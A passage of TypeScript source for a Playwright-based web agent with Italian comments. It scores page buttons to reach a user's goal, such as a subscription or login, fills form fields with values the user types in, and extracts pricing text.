          const isCommonAction = text.includes("upgrade") || text.includes("select") || text.includes("buy") || text.includes("choose") || text.includes("get") || text.includes("abbonati") || text.includes("start") || text.includes("piano");
          const isSocialLogin = text.includes("github") || text.includes("google") || text.includes("apple") || text.includes("facebook");
          
          if (!text || text.length > 100) return null;
          
          // Anti-Loop: Escludi se già cliccato (anche se corto come "25%")
          if (exclude.some(ex => isSimilar(text, ex))) return null;

          const rect = el.getBoundingClientRect();
          if (rect.width === 0 || rect.height === 0) return null;

          const style = window.getComputedStyle(el);
          const isClickable = style.cursor === 'pointer' || el.getAttribute('onclick') || el.tagName === 'A' || el.tagName === 'BUTTON' || el.closest('a, button');
          if (!isClickable) return null;
          if (el.getAttribute('href')?.startsWith('mailto:')) return null;

          let score = 0;

          // Penalizzazione testi puramente numerici o percentuali (evita loop su "25%")
          if (/^[\d%\s]+$/.test(text) || (text.includes('%') && text.length < 5)) {
             score -= 200;
          }
          
          // Heuristic VISUALE (Sembra un bottone?)
          const hasBg = style.backgroundColor !== 'transparent' && style.backgroundColor !== 'rgba(0, 0, 0, 0)';
          const hasBorder = style.borderRadius !== '0px' && style.borderRadius !== '0';
          const isRealButton = el.tagName === 'BUTTON' || el.tagName === 'A' || el.getAttribute('role') === 'button';
          
          if (hasBg || hasBorder) score += 25;
          if (isRealButton) score += 40; // Priorità ai tag semantici interattivi

          // Scoring TESTUALE
          detectedIntents.forEach(intent => {
            if (concepts[intent].some(k => isSimilar(text, k))) {
              score += 60; 
              // Penalizzazione pesante per termini di aiuto/recovery se l'intento è acquisto o login
              if (intent === "aiuto" && (detectedIntents.includes("acquisto") || detectedIntents.includes("account"))) score -= 500;
            }
          });
          
          if (text.includes('?') || text.startsWith('how') || text.startsWith('what') || text.startsWith('can i') || text.includes('forget')) {
             if (detectedIntents.includes("acquisto") || detectedIntents.includes("account")) score -= 550;
          }

          goalWords.forEach(word => {
            if (isSimilar(text, word)) {
               score += 80;
               // Bonus extra per termini specifici di "periodo" o "piano" se presenti nel goal
               if (concepts["periodo"].some(k => isSimilar(text, k))) score += 100;
            }
            
            // Penalizzazione opposti con Regex per precisione
            if (opposites[word]) {
              if (opposites[word].some(opp => new RegExp(opp, 'i').test(text))) {
                score -= 300;
              }
            }
          });

          // Scoring CONTESTUALE (Parent/Container)
          const container = el.closest('div, section, article, card, [class*="card"], [class*="item"], .pricing-column, [class*="pricing"], [class*="plan"]');
          if (container) {
            const containerText = container.innerText.toLowerCase();
            goalWords.forEach(word => {
              if (containerText.includes(word)) score += 100; // Bonus massiccio
              
              if (opposites[word]) {
                // Penalizziamo il container solo se l'opposto è un titolo o molto corto (evitiamo "everything in Pro")
                opposites[word].forEach(opp => {
                   if (new RegExp('\\\\b' + opp + '\\\\b', 'i').test(containerText) && containerText.length < 300) {
                      score -= 100;
                   }
                });
              }
            });

            const actionsInContainer = container.querySelectorAll('a, button, [role="button"]');
            if (actionsInContainer.length === 1) score += 40;
          }

          if (isCommonAction && score > 50) score += 100; // Priorità assoluta a Upgrade/Select se il contesto è giusto
          if (isSocialLogin && (detectedIntents.includes("account") || detectedIntents.includes("acquisto"))) score -= 300; // Penalizza social se vogliamo email

          const isInNav = el.closest('nav, header, .menu, .navbar') !== null;
          if (isInNav && currentStep === 1) score += 30;
          if (currentStep > 1 && isInNav) score -= 100;
          if (el.closest('footer')) score -= 200;
          
          if (rect.top > 100 && rect.top < window.innerHeight * 0.8) score += 30;

          return { text: text.substring(0, 50), score, tag: el.tagName, rect };
        }).filter(el => el !== null && el.score > 25);

        return scored.sort((a, b) => b.score - a.score)[0] || null;
      })(${JSON.stringify({ goal: userGoal, exclude: excludeText, pastMemory: this.memory, concepts: universalConcepts, opposites: oppositeConcepts, currentStep: step })})`;

      return await this.page!.evaluate(evalString);
    };

    // --- CICLO DI AZIONE INTELLIGENTE CON AUTO-DEBUG AVANZATO ---
    let currentStep = 1;
    let maxSteps = 8;
    let sessionHistory: string[] = ["policy", "terms", "privacy", "cookie", "legal", "faq", "usage", "models", "fails", "refund", "mail"];
    let lastActionText = "";
    let lastUrl = this.page.url();

    while (currentStep <= maxSteps) {
      console.log(`\n🔄 Step ${currentStep}: Ragiono sulla pagina attuale...`);

      // GESTIONE ERRORI DI CONTESTO (Navigazione in corso)
      try {
        await this.page.waitForLoadState('domcontentloaded', { timeout: 2000 }).catch(() => {});
      } catch (e) {}

      // 1. RILEVAMENTO MODULI PRIORITARIO (Login/Registrazione)
      const inputFields = await this.page.evaluate(() => {
        return Array.from(document.querySelectorAll('input, textarea')).map(i => ({
          placeholder: (i as HTMLInputElement).placeholder,
          name: (i as HTMLInputElement).name,
          type: (i as HTMLInputElement).type,
          id: (i as HTMLElement).id,
          label: document.querySelector(`label[for="${(i as HTMLElement).id}"]`)?.textContent || "",
          visible: (i as HTMLElement).offsetParent !== null
        })).filter(i => i.visible);
      });

      if (inputFields.length >= 1 && (goal.includes("login") || goal.includes("accedi") || goal.includes("abbonamento") || goal.includes("acquisto"))) {
        console.log("📝 Rilevato campo di input. Verifico se è necessario compilare...");
        let filledSomething = false;
        for (const field of inputFields) {
          const fieldDesc = (field.label || field.placeholder || field.name || field.id).toLowerCase();
          if (!fieldDesc) continue;

          let valueToFill = "";
          if (fieldDesc.includes("email") || fieldDesc.includes("posta") || fieldDesc.includes("username") || fieldDesc.includes("utente")) {
            valueToFill = readline.question(`📧 Campo "${fieldDesc}" rilevato. Inserisci Email/User: `);
          } else if (field.type === "password" || fieldDesc.includes("password")) {
            valueToFill = readline.question(`🔑 Campo Password rilevato. Inserisci la password: `, { hideEchoBack: true });
          } else if (goal.includes("abbonamento") && (fieldDesc.includes("card") || fieldDesc.includes("carta") || fieldDesc.includes("numero"))) {
             valueToFill = readline.question(`💳 Campo Pagamento "${fieldDesc}" rilevato. Cosa inserire? `);
          }

          if (valueToFill) {
            await this.smartFill(fieldDesc, valueToFill);
            filledSomething = true;
          }
        }

        if (filledSomething) {
          const submitTexts = ["login", "accedi", "invia", "conferma", "submit", "sign in", "entra", "next", "avanti", "continua", "continue", "get started", "procedi"];
          let submitted = false;
          for (const text of submitTexts) {
            const btn = this.page.locator(`button:has-text("${text}"), input[type="submit"], [role="button"]:has-text("${text}"), a:has-text("${text}")`).first();
            if (await btn.isVisible({ timeout: 1000 })) {
              console.log(`✅ Azione inviata tramite: "${text}"`);
              await btn.click();
              submitted = true;
              break;
            }
          }

          if (submitted) {
            await this.page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
            await this.page.waitForTimeout(3000);
            currentStep++;
            continue; // Ora continua correttamente il ciclo while
          }
        }
      }

      let best = await findBestElement(goal, sessionHistory, currentStep);
      
      // AUTO-DEBUG AVANZATO
      if (!best || best.score < 60) {
        console.log("🛠️ Auto-Debug: Analisi dei blocchi transazionali...");
        const deepDebugEval = `(() => {
          const goalWords = ${JSON.stringify(goal.split(' ').filter(w => w.length > 2))};
          const opposites = ${JSON.stringify(oppositeConcepts)};
          
          const blocks = Array.from(document.querySelectorAll('div, section, article, .pricing-column, [class*="card"], [class*="plan"]'));
          const targetBlocks = blocks.map(b => {
            const text = b.innerText.toLowerCase();
            let score = 0;
            goalWords.forEach(w => { 
               if (text.includes(w)) score += 20;
               // Opposti nel blocco (solo se precisi)
               if (opposites[w]) {
                 opposites[w].forEach(opp => {
                   if (new RegExp('\\\\b' + opp + '\\\\b', 'i').test(text)) score -= 15;
                 });
               }
            });
            if (text.includes('?') || text.includes('faq')) score -= 150;
            return { block: b, score };
          })
          .filter(b => b.score > 0)
          .sort((a, b) => b.score - a.score);

          if (targetBlocks.length > 0) {
            // Cerca esplicitamente bottoni interattivi nel blocco vincente
            const actions = Array.from(targetBlocks[0].block.querySelectorAll('a, button, [role="button"]'))
              .filter(a => {
                const t = a.innerText.toLowerCase().trim();
                // Escludi se è solo un numero o una percentuale o un social login se stiamo compilando
                if (/^[\d%\s]+$/.test(t) || (t.includes('%') && t.length < 5)) return false;
                if (t.includes("github") || t.includes("google") || t.includes("apple") || t.includes("facebook")) return false;
                return t.length > 0;
              });

            const upgradeBtn = actions.find(a => {
               const t = a.innerText.toLowerCase();
               return t.includes('upgrade') || t.includes('select') || t.includes('piano') || t.includes('start') || t.includes('get') || t.includes('scegli');
            });
            
            const bestAction = upgradeBtn || actions[0];
            
            if (bestAction) {
              return { text: (bestAction.innerText || bestAction.getAttribute("aria-label") || "Upgrade Plan").trim(), score: 999, tag: "DEEP_DEBUG" };
            }
          }
          return null;
        })()`;

        try {
          const deepFallback = await this.page.evaluate(deepDebugEval) as any;
          if (deepFallback) {
            console.log(`💡 Auto-Correzione: Identificato bottone nel blocco di interesse: "${deepFallback.text}"`);
            best = deepFallback;
          }
        } catch (e) {
          console.log("⚠️ Auto-Debug fallito.");
        }
      }

      if (best && (best.score > 20 || best.tag === "DEEP_DEBUG")) {
        console.log(`🎯 Decisione: Clicco su "${best.text}" (Punteggio: ${best.score})`);
        lastActionText = best.text;
        
        await this.smartClick(best.text);
        sessionHistory.push(best.text.toLowerCase());
        
        await this.page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
        await this.page.waitForTimeout(2000);
        
        const currentUrl = this.page.url();
        if (currentUrl !== lastUrl) {
          console.log(`✨ Pagina cambiata: ${currentUrl}`);
          lastUrl = currentUrl;
          sessionHistory = ["policy", "terms", "privacy", "cookie", "legal", "faq", "usage", "models", "fails", "refund", "mail"];
        }
        
        currentStep++;
      } else {
        console.log("ℹ️ Nessuna azione rimasta. Passo all'estrazione finale.");
        break;
      }
    }

    // --- ESTRAZIONE DATI DINAMICA ---
    console.log("\n📊 Fase Finale: Estrazione Informazioni...");
    const extractEvalString = `((userGoal) => {
      const goalWords = userGoal.split(/\\s+/).filter(w => w.length > 2);
      
      // 1. Cerchiamo "blocchi" di contenuto (pricing cards)
      const blocks = Array.from(document.querySelectorAll('div, section, article, li'))
        .filter(el => {
          const text = el.innerText || "";
          return text.length > 10 && text.length < 500 && /[\\$€£\\d]/.test(text);
        });

      let results = [];

      // 2. Analisi per ogni blocco
      blocks.forEach(block => {
        const text = block.innerText.replace(/\\n/g, ' ').trim();
        const lowerText = text.toLowerCase();
        
        let matches = 0;
        goalWords.forEach(w => { if (lowerText.includes(w)) matches++; });

        if (matches > 0) {
          // Cerca prezzi nel blocco
          const priceMatch = text.match(/[\\$€£]\\s?\\d+([.,]\\d+)?/g);
          if (priceMatch) {
            results.push({
              text: text.substring(0, 150) + (text.length > 150 ? '...' : ''),
              score: matches + 5,
              hasPrice: true
            });
          } else {
            results.push({ text, score: matches, hasPrice: false });
          }
        }
      });

      // 3. Fallback: linee di testo semplici se non abbiamo trovato blocchi validi
      if (results.length < 3) {
        const lines = document.body.innerText.split("\\n").map(l => l.trim()).filter(l => l.length > 5);
        lines.forEach(line => {
          let matches = 0;
          const lowerLine = line.toLowerCase();
          goalWords.forEach(w => { if (lowerLine.includes(w)) matches++; });
          if (matches > 0 || (/[\\$€£\\d]/.test(line) && goalWords.some(w => lowerLine.includes(w)))) {
            results.push({ text: line, score: matches + (/[\\$€£\\d]/.test(line) ? 2 : 0), hasPrice: /[\\$€£\\d]/.test(line) });
          }
        });
      }

      return results
        .sort((a, b) => b.score - a.score)
        .slice(0, 10)
        .map(r => r.text);
    })(${JSON.stringify(goal)})`;

    const extractedData = await this.page.evaluate(extractEvalString) as string[];

    if (extractedData.length > 0) {
      console.log("\n✅ Risultati trovati:");
      [...new Set(extractedData)].forEach(d => console.log(`> ${d}`));
    }

    // --- CICLO DI APPRENDIMENTO (FEEDBACK) ---
    if (lastActionText) {
      const feedback = readline.question(`\n🤔 Ho raggiunto il tuo obiettivo con "${lastActionText}"? (s/n): `).toLowerCase();
      const success = feedback === 's' || feedback === 'si' || feedback === 'y' || feedback === 'yes';
      
      this.learn(goal, lastActionText, success);

      if (!success) {
        console.log("😔 Mi dispiace. Sto preparando un report dell'errore...");
        const report = {
          timestamp: new Date().toISOString(),
          user_goal: goal,
          url_finale: this.page?.url(),
          passaggi_eseguiti: this.history,
          ultimo_elemento_cliccato: lastActionText,
          suggested_fix: "Analizza questo report per migliorare il mio ragionamento semantico."
        };
        
        const reportPath = path.join(__dirname, 'ai_fail_report.json');
        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
        
        console.log(`\n📂 Report salvato in: ${reportPath}`);
        console.log("👉 Per favore, incolla il contenuto di questo file nella nostra chat cosi' posso correggermi!");
      } else {
        console.log("🎉 Ottimo! Ho imparato questa azione.");
      }
    }

    // 4. Gestione Moduli (solo se non abbiamo già navigato/estratto)
    const inputFields = await this.page.evaluate(() => {
      return Array.from(document.querySelectorAll('input, textarea')).map(i => ({
        placeholder: (i as HTMLInputElement).placeholder,
        name: (i as HTMLInputElement).name,
        type: (i as HTMLInputElement).type,
        id: (i as HTMLElement).id,
        label: document.querySelector(`label[for="${(i as HTMLElement).id}"]`)?.textContent || ""
      }));
    });

    if (inputFields.length > 0 && !goal.includes("costo") && extractedData.length === 0) {
      console.log("📝 Rilevato modulo. Inizio compilazione assistita...");
      for (const field of inputFields) {
        const fieldDesc = (field.label || field.placeholder || field.name || field.id).toLowerCase();
        if (!fieldDesc) continue;

        let valueToFill = "";
        if (fieldDesc.includes("email") || fieldDesc.includes("posta")) {
          valueToFill = readline.question(`📧 Ho trovato un campo Email. Inserisci l'email da usare: `);
        } else if (field.type === "password" || fieldDesc.includes("password") || fieldDesc.includes("chiave")) {
          valueToFill = readline.question(`🔑 Ho trovato un campo Password. Inserisci la password: `, { hideEchoBack: true });
        } else if (fieldDesc.includes("telefono") || fieldDesc.includes("cellulare") || fieldDesc.includes("phone")) {
          valueToFill = readline.question(`📱 Ho trovato un campo Telefono. Inserisci il numero: `);
        } else if (fieldDesc.includes("nome") || fieldDesc.includes("cognome") || fieldDesc.includes("user")) {
          valueToFill = readline.question(`👤 Ho trovato un campo Nome/User. Cosa devo scrivere? `);
        }

        if (valueToFill) {
          await this.smartFill(fieldDesc, valueToFill);
        }
      }

      // Prova a inviare
      const submitTexts = ["login", "accedi", "invia", "conferma", "search", "cerca", "vai", "submit", "registrati", "sign up", "ok"];
      for (const text of submitTexts) {
        const btn = this.page.locator(`button:has-text("${text}"), input[type="submit"], a:has-text("${text}")`).first();
        if (await btn.isVisible({ timeout: 500 })) {
          await btn.click();
          console.log(`✅ Azione inviata tramite bottone: "${text}"`);
          break;
        }
      }
    }

    console.log("\n🏁 Sessione IA conclusa.");
  }

  private showHelp() {
    console.log("\n📖 --- GUIDA COMANDI ---");
    console.log("- ia                   : Modalità assistente intelligente (ti guida lui).");
    console.log("- scanner / scan       : Avvia la GUI di scansione WiFi (wifi_scanner_89.py).");
    console.log("- clicca [testo]       : Clicca su un bottone o link con quel testo.");
    console.log("- clicca [X,Y]         : Clicca alle coordinate pixel (es. clicca 500,300).");
    console.log("- scrivi [T] in [C]    : Scrive il testo T nel campo di input C.");
    console.log("- scorrere / scroll    : Scorre la pagina verso il basso.");
    console.log("- ricarica / reload    : Ricarica la pagina attuale.");
    console.log("- screenshot / foto    : Salva un'immagine della pagina corrente.");
    console.log("- indietro / back      : Naviga nella cronologia del browser.");
    console.log("- avanti / forward     : Naviga in avanti nella cronologia.");
    console.log("- aspetta [N]          : Attende N secondi.");
    console.log("- analizza [query]     : Elenca elementi interattivi (opzionalmente filtrati).");
    console.log("- [numero]             : Dopo 'analizza', digita il numero per interagire.");
    console.log("- status               : Mostra URL e Titolo della pagina.");
    console.log("- aiuto                : Mostra questa guida.");
    console.log("- chiudi / exit        : Termina la sessione.");
  }
}

const agent = new WebAgent();
agent.start().catch(console.error);
